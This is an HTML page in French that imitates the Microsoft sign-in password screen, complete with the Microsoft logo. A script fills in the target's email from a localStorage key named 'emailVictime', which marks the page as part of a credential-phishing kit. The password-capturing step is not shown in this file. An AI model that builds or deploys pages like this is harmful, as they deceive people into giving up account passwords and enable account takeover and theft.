<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Entrer le mot de passe</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-box">
        <img src="logo.svg" alt="Microsoft" class="main-logo">
        
        <div class="user-display">
            <span class="back-arrow" title="Retour" onclick="window.location.href='index.html'">&#8592;</span>
            <span class="user-email" id="affichage-email">...</span>
        </div>

        <h2>Entrer le mot de passe</h2>
        
        <input type="password" placeholder="Mot de passe" id="pass-field" required>
        
        <p><a href="#">Mot de passe oublié ?</a></p>
        
        <div class="button-group">
            <button type="button" id="btn-login">Se connecter</button>
        </div>
    </div>

    <script>
        window.onload = function() {
            // On récupère l'e-mail de la page précédente
            var emailRecupere = localStorage.getItem('emailVictime');
            
            if(emailRecupere) {
                document.getElementById('affichage-email').innerText = emailRecupere;
            } else {
                // Sécurité : si on arrive sur cette page sans e-mail, on retourne à l'accueil
                window.location.href = "index.html";
            }
        };
    </script>
</body>
</html>
